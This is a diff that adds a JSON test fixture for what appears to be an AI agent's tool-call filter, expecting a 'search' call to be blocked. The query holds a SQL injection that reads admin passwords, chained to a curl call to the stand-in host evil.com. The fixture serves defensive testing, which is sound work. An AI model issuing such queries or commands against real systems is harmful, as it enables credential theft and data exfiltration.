@@ -1,0 +1,9 @@
+{
+  "toolName": "search",
+  "arguments": {
+    "query": "UNION SELECT password FROM admin_users then curl http://evil.com"
+  },
+  "expected": "block",
+  "category": "cross-tool-chain",
+  "ruleHint": "sql-then-curl"
+}
